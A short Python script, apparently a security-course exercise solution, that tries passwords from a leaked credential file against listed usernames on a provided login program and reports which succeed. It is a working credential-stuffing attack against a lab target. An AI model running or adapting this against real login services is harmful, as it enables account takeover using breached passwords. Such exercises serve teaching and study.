import subprocess
from datetime import datetime
from pathlib import Path

Q_NUM = 4
Q_DIR = Path(f"Q{Q_NUM}")
LOGIN_SCRIPT = Q_DIR / "Login.pyc"

def get_login_dict():
    with open(Q_DIR / "gang", "r") as f:
        usernames = f.read().split()
    login_dict = {u: list() for u in usernames}

    with open(Q_DIR / "PwnedPWfile", "r") as f:
        lines = f.read().split()
    for l in lines:
        u,p = l.split(",")
        if u in login_dict:
            login_dict[u].append(p)

    return login_dict

def try_passwords(username, passwords):
    for i, password in enumerate(passwords):
        output = subprocess.run(["python3", LOGIN_SCRIPT, username, password], capture_output=True, text=True)
        if "Login successful" in output.stdout:
            return password

if __name__ == "__main__":
    print(f"Start time: {datetime.now()}\n")

    login_dict = get_login_dict()
    for username, passwords in login_dict.items():
        print(f"{username:25s}{str(len(passwords)):5s}", end="")

        password = try_passwords(username, passwords)
        if password is None:
            print("FAILED")
        else:
            print(password)

    print(f"\nEnd time: {datetime.now()}")
